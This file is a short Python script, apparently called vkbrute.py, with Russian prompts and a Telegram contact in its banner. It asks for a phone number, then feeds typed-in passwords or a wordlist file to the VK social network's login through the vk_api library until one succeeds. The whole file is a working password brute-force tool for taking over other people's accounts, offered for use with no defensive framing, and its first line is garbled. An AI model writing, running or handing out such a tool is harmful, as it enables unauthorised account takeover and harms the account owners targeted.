# -*- codingpython3 vkbrute.py: utf-8 -*-
import vk_api
import colorama 
from colorama import Fore, Back, Style

logo = (''' 
Мы в телеграме: @Hurring124''')
print(logo)

def wordvvod():
    words = list(map(str, input("Слова для брута(разделяйте запятой(, )): ").split(', ')))
    for password in words:
        try:
            vk_session = vk_api.VkApi(phone, str(password))
            vk_session.auth()
            print(Fore.GREEN +"FOUND: " + str(password))
            break
        except:
            print(Fore.RED + str(password) + ' NOT FOUND')

def wordtxt():
    with open(txt) as f:
        lines = f.readlines()
    lines = [line.strip('\n') for line in open(txt)]
    for password in lines:
        try:
            vk_session = vk_api.VkApi(phone, str(password))
            vk_session.auth()
            print(Fore.GREEN +"FOUND: " + str(password))
            break
        except:
            print(Fore.RED + str(password) + ' NOT FOUND')
    f.close()

if __name__ == '__main__':
    phone = input('Телефон: ')
    word = input('Откуда берём слова?: \n[1] - Записываем тут\n[2] - Из txt файла(Словаря)\n'+ Fore.RED +'vkbrute -> ')
    if word == "1":
        wordvvod()
    elif word == "2":
        txt = input('Ведите название файла(example.txt): ')
        wordtxt()
    else:
        print('Повторите попытку')
        exit(0)
